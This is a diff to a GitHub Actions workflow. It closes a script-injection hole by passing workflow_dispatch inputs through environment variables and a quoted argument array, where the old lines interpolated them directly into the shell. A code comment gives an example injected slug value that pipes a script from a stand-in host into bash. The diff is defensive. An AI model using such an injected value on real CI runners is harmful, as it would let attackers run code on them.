@@ -43,9 +43,18 @@ jobs:
         run: pip install -r requirements.txt
 
       - name: Run backfill
+        # Untrusted workflow_dispatch inputs are passed through `env:` and read
+        # as quoted shell variables. They are NEVER interpolated with
+        # `${{ github.event.inputs.* }}` inside this run body, which would let a
+        # free-form `slug` like `x; curl evil.sh | bash` inject commands into the
+        # runner (script injection). `mode` is a `choice` (already constrained)
+        # but is routed the same way for consistency.
+        env:
+          MODE: ${{ github.event.inputs.mode }}
+          SLUG: ${{ github.event.inputs.slug }}
         run: |
-          ARGS="--${{ github.event.inputs.mode }} --allow"
-          if [ -n "${{ github.event.inputs.slug }}" ]; then
-            ARGS="$ARGS --slug ${{ github.event.inputs.slug }}"
+          args=(--"$MODE" --allow)
+          if [ -n "$SLUG" ]; then
+            args+=(--slug "$SLUG")
           fi
-          bash scripts/run_backfill.sh $ARGS
+          bash scripts/run_backfill.sh "${args[@]}"
